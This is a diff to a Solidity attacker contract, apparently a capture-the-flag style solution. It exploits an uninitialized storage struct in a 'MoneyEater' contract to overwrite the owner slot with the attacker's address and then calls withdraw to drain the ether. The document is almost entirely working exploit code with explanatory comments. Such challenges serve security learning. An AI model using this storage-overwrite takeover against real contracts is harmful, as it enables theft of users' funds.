@@ -6,9 +6,10 @@ import "./MoneyEater.sol";
 
 contract MoneyEaterAttacker{
     
-    MoneyEater player;
+    MoneyEater eater;
+    address player = address(this);
     function MoneyEaterAttacker(address _addr)public{
-        player = MoneyEater(_addr);
+        eater = MoneyEater(_addr);
     }
 
     event isCompleteEvent(bool isComplete);
@@ -17,15 +18,15 @@ contract MoneyEaterAttacker{
     //When omitted, storage is assumed
     // The meal.timestamp are allocated in slot 0 and meal.etherAmount in the slot 1(where the owner address is located)
 
-    // need to choose etherAmount in a way such that it overwrites the owner with our
-    // address, the scale is wrong as well and uses 10^36 which makes it exploitable
-
+    // need to choose etherAmount in a way such that it overwrites the owner with ou address
     function hack() public
     {
         // 1 ether := 10**18 => scale is 10**18 * 10**18 = 10**36
-        uint256 num_exploit = uint256(address(this)) / 10**36;
-        player.feed.value(uint256(address(this)))(num_exploit);
-        player.withdraw();
-        emit isCompleteEvent(player.isComplete());
+        uint256 num_exploit = uint256(address(player)) / 10**36;
+        // If we send the decimal number that is equal to our attack account address, the owner became us
+        eater.feed.value(num_exploit)(num_exploit);
+        //And then all that is left is call withdraw
+        eater.withdraw();
+        emit isCompleteEvent(eater.isComplete());
     }
 }
